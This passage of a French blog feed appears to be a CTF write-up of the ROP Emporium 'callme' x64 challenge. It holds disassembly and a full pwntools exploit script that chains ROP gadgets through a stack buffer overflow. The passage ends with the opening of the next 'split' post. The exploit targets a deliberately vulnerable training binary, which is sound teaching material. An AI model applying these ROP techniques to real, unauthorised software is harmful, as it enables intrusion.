<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass main
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function main:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400847</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400848</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040084b</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: mov    rax,QWORD PTR [rip<span style="color:#f92672">+</span><span style="color:#ae81ff">0x20081e</span>]        <span style="color:#75715e"># 0x601070 &lt;stdout@@GLIBC_2.2.5&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400852</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">11</span><span style="color:#f92672">&gt;</span>:  mov    ecx,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400857</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">16</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x2</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040085c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">21</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400861</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">26</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400864</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">29</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400730</span> <span style="color:#f92672">&lt;</span>setvbuf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400869</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">34</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009c8</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040086e</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">39</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400873</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">44</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009df</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400878</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">49</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040087d</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">54</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400882</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400898</span> <span style="color:#f92672">&lt;</span>pwnme<span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400887</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009e7</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040088c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">69</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400891</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">74</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400896</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">79</span><span style="color:#f92672">&gt;</span>:  pop    rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400897</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">80</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>Comme d&rsquo;habitude, il fait appel à la fonction <code>pwnme</code>, désassemblons-la elle aussi:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> disass pwnme
</span></span><span style="display:flex;"><span>Dump of assembler code <span style="color:#66d9ef">for</span> function pwnme:
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400898</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">0</span><span style="color:#f92672">&gt;</span>: push   rbp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x0000000000400899</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">1</span><span style="color:#f92672">&gt;</span>: mov    rbp,rsp
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x000000000040089c</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">4</span><span style="color:#f92672">&gt;</span>: sub    rsp,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">8</span><span style="color:#f92672">&gt;</span>: lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a4</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">12</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008a9</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">17</span><span style="color:#f92672">&gt;</span>:  mov    esi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ae</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">22</span><span style="color:#f92672">&gt;</span>:  mov    rdi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">25</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400700</span> <span style="color:#f92672">&lt;</span>memset<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008b6</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">30</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x4009f0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008bb</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">35</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">40</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a13</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008c5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">45</span><span style="color:#f92672">&gt;</span>:  mov    eax,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ca</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">50</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006e0</span> <span style="color:#f92672">&lt;</span>printf<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008cf</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">55</span><span style="color:#f92672">&gt;</span>:  lea    rax,[rbp<span style="color:#f92672">-</span><span style="color:#ae81ff">0x20</span>]
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d3</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">59</span><span style="color:#f92672">&gt;</span>:  mov    edx,<span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008d8</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">64</span><span style="color:#f92672">&gt;</span>:  mov    rsi,rax
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008db</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">67</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x0</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">72</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x400710</span> <span style="color:#f92672">&lt;</span>read<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008e5</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">77</span><span style="color:#f92672">&gt;</span>:  mov    edi,<span style="color:#ae81ff">0x400a16</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ea</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">82</span><span style="color:#f92672">&gt;</span>:  call   <span style="color:#ae81ff">0x4006d0</span> <span style="color:#f92672">&lt;</span>puts<span style="color:#a6e22e">@plt</span><span style="color:#f92672">&gt;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008ef</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">87</span><span style="color:#f92672">&gt;</span>:  nop
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f0</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">88</span><span style="color:#f92672">&gt;</span>:  leave  
</span></span><span style="display:flex;"><span>   <span style="color:#ae81ff">0x00000000004008f1</span> <span style="color:#f92672">&lt;+</span><span style="color:#ae81ff">89</span><span style="color:#f92672">&gt;</span>:  ret    
</span></span><span style="display:flex;"><span>End of assembler dump<span style="color:#f92672">.</span>
</span></span></code></pre></div><p>On voit donc que la fonction <code>read</code> va lire <code>0x200</code> bytes puis les stocker dans un buffer de <code>0x20</code> bytes, ce qui est largement suffisant pour l&rsquo;overflow et faire ce qu&rsquo;on veut.</p>
<p>Maintenant, il nous faut les adresses des trois fonctions callme, pour les trouver, on peut par exemple utiliser <code>pwndbg</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> info functions
</span></span><span style="display:flex;"><span>All defined functions:
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Non<span style="color:#f92672">-</span>debugging symbols:
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006a8</span>  _init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006d0</span>  puts<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006e0</span>  printf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006f0</span>  callme_three<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400700</span>  memset<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400710</span>  read<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400720</span>  callme_one<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400730</span>  setvbuf<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400740</span>  callme_two<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400750</span>  exit<span style="color:#a6e22e">@plt</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400760</span>  _start
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400790</span>  _dl_relocate_static_pie
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007a0</span>  deregister_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004007d0</span>  register_tm_clones
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400810</span>  __do_global_dtors_aux
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400840</span>  frame_dummy
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400847</span>  main
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400898</span>  pwnme
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004008f2</span>  usefulFunction
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span>  usefulGadgets
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x0000000000400940</span>  __libc_csu_init
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b0</span>  __libc_csu_fini
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004009b4</span>  _fini
</span></span></code></pre></div><p>On voit que:</p>
<ul>
<li>callme_one est située à <code>0x00400720</code></li>
<li>callme_two est située à <code>0x00400740</code></li>
<li>callme_three est située à <code>0x004006f0</code></li>
</ul>
<p>Maintenant, il nous faut un gadget qui va pop <code>rdi</code>, <code>rsi</code> et <code>rdx</code> puisque ce sont les registres utilisés pour les 3 premiers arguments
(cf. <a href="https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/linux-x64-calling-convention-stack-frame">linux calling convention stack frame</a>)</p>
<p>On va utiliser ROPgadget pour le trouver:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme <span style="color:#f92672">|</span> grep <span style="color:#e6db74">&#34;pop rdi ; pop rsi ; pop rdx&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x000000000040093c</span> : pop rdi ; pop rsi ; pop rdx ; ret
</span></span></code></pre></div><p>On a notre gadget, et on peut totalement l&rsquo;utiliser 3 fois pour chaque fonction, donc pas besoin d&rsquo;en trouver deux autres.</p>
<p>Récapitulons avant de commencer notre exploit:</p>
<ul>
<li>On peut commencer à réecrire la sauvegarde de <code>rip</code> en entrant 40 bytes dans l&rsquo;input</li>
<li>On peut mettre les valeurs qu&rsquo;on veut dans <code>rdi</code>, <code>rsi</code> et <code>rdx</code> grâce à notre gadget</li>
<li>On peut appeller chaque fonction une par une avec les arguments qu&rsquo;on veut</li>
</ul>
<p>Très bien, commençons notre exploit:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(p<span style="color:#f92672">.</span>recvall())
</span></span></code></pre></div><p>Testons le pour s&rsquo;assurer qu&rsquo;il fonctionne:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548940-3656b68e-932b-4e5b-ab2f-d04687f65fdb.png" alt="2023-01-15-152741_1107x131_scrot"></p>
<p>Et on voit que le programme a <code>segfault</code>&hellip; Pour rappel je suis sous <strong>Ubuntu 22.04</strong> donc mon système est affecté par les problèmes de <em>stack alignment</em>. On va donc ajouter un ret juste après notre padding, qu&rsquo;on peut trouver avec ROPgadget</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>ROPgadget <span style="color:#f92672">--</span>binary callme
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>Gadgets information
</span></span><span style="display:flex;"><span><span style="color:#f92672">============================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span><span style="color:#ae81ff">0x00000000004006be</span> : ret
</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;...&gt;</span>
</span></span><span style="display:flex;"><span>Unique gadgets found: <span style="color:#ae81ff">110</span>
</span></span></code></pre></div><h2 id="final-payload">Final Payload</h2>
<p>Complétons notre exploit avec ce ret:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./callme&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> process()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>recv()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>padding <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>rbp <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00000000004006be</span>)
</span></span><span style="display:flex;"><span>pop_rdi_rsi_rdx <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x000000000040093c</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>callme_one <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400720</span>)
</span></span><span style="display:flex;"><span>callme_two <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x00400740</span>)
</span></span><span style="display:flex;"><span>callme_three <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0x004006f0</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>arg1 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xdeadbeefdeadbeef</span>)
</span></span><span style="display:flex;"><span>arg2 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xcafebabecafebabe</span>)
</span></span><span style="display:flex;"><span>arg3 <span style="color:#f92672">=</span> p64(<span style="color:#ae81ff">0xd00df00dd00df00d</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> padding <span style="color:#f92672">+</span> rbp
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ret gadget</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> ret
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># On met les arguments dans les registres, puis on jump à la fonction callme_one</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_one
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Pareil, on remet les arguments dans les registres et cette fois on jump à callme_two</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_two
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ...</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> pop_rdi_rsi_rdx
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> arg1 <span style="color:#f92672">+</span> arg2 <span style="color:#f92672">+</span> arg3
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">+=</span> callme_three
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>p<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Flag:&#34;</span>,p<span style="color:#f92672">.</span>recvall()<span style="color:#f92672">.</span>split(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)[<span style="color:#ae81ff">3</span>]<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#39;utf-8&#39;</span>))
</span></span></code></pre></div><p>Et cette fois, il devrait fonctionner:</p>
<p><img src="https://user-images.githubusercontent.com/77807503/212548977-7d83ef59-bf5a-497e-b655-9011e98b84d5.png" alt="2023-01-15-153142_994x552_scrot"></p>
<p>Parfait, on a réussi à récupérer le flag</p>
<blockquote>
<p>Note: Nous ne sommes pas en x86_x64 donc nous n&rsquo;aurions pas dû avoir besoin de doubler les valeurs des arguments comme dit dans la consigne mais ça ne fonctionnait pas sans&hellip;</p></blockquote>
]]></content>
        </item>
        
        <item>
            <title>🇫🇷 ROPEmporium - split (x64)</title>
            <link>/posts/2023/01/ropemporium-split-x64/</link>
            <pubDate>Sun, 01 Jan 2023 00:00:00 +0000</pubDate>
            
            <guid>/posts/2023/01/ropemporium-split-x64/</guid>
            <description>&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Deuxième exercice de ROPEmporium, un tout petit peu plus complexe que le précédent mais il reste très accessible. Je vais essayer une fois de plus d&amp;rsquo;expliquer le plus clairement possible ce que j&amp;rsquo;ai fait pour le réussir. Si j&amp;rsquo;ai fait des erreurs, n&amp;rsquo;hésitez pas à me contacter sur &lt;a href=&#34;https://discord.com/users/254689803822563348&#34;&gt;discord&lt;/a&gt; pour me le dire.&lt;/p&gt;
&lt;p&gt;Si vous ne comprenez pas quelque chose, je vous invite à &lt;a href=&#34;/series/ropemporium-x64-series/&#34;&gt;regarder la série dans l&amp;rsquo;ordre&lt;/a&gt;.&lt;/p&gt;
&lt;h2 id=&#34;file-information&#34;&gt;File information&lt;/h2&gt;
&lt;p&gt;Avant de commencer à regarder dans l&amp;rsquo;executable, il faut savoir à quoi on s&amp;rsquo;attaque, on va utiliser &lt;code&gt;file&lt;/code&gt; pour avoir des informations sur le fichier, puis &lt;code&gt;checksec&lt;/code&gt; pour voir les éventuelles sécuritées avec lesquelles il a été compilé&lt;/p&gt;</description>
            <content type="html"><![CDATA[<h2 id="note">Note</h2>
<p>Deuxième exercice de ROPEmporium, un tout petit peu plus complexe que le précédent mais il reste très accessible. Je vais essayer une fois de plus d&rsquo;expliquer le plus clairement possible ce que j&rsquo;ai fait pour le réussir. Si j&rsquo;ai fait des erreurs, n&rsquo;hésitez pas à me contacter sur <a href="https://discord.com/users/254689803822563348">discord</a> pour me le dire.</p>
<p>Si vous ne comprenez pas quelque chose, je vous invite à <a href="/series/ropemporium-x64-series/">regarder la série dans l&rsquo;ordre</a>.</p>
<h2 id="file-information">File information</h2>
